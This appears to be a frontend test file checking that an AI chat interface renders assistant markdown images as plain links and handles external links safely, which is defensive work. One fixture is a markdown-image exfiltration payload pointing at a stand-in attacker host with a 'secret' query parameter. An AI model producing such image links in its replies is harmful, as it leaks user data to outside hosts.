import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { describe, it, expect } from 'vitest';

import { ChatMessage } from '../ChatMessage';

function renderAssistant(content: string) {
  return render(
    <MemoryRouter>
      <ChatMessage
        message={{
          id: 'm1',
          conversation_id: 'c1',
          role: 'assistant',
          content,
          tool_calls: [],
          created_at: '2026-10-05T00:00:00Z',
        }}
      />
    </MemoryRouter>,
  );
}

describe('ChatMessage markdown', () => {
  it('renders a markdown image as a link instead of loading it', () => {
    const { container } = renderAssistant('![leak](https://evil.host/p.png?d=secret)');

    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'leak' });
    expect(link).toHaveAttribute('href', 'https://evil.host/p.png?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('opens a protocol-relative //host link as an external link', () => {
    renderAssistant('[docs](//evil.host/x)');

    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noreferrer noopener');
  });

  it('keeps a single-slash path as an in-app link', () => {
    renderAssistant('[project](/projects/p1)');

    const link = screen.getByRole('link', { name: 'project' });
    expect(link).toHaveAttribute('href', '/projects/p1');
    expect(link).not.toHaveAttribute('target');
  });
});
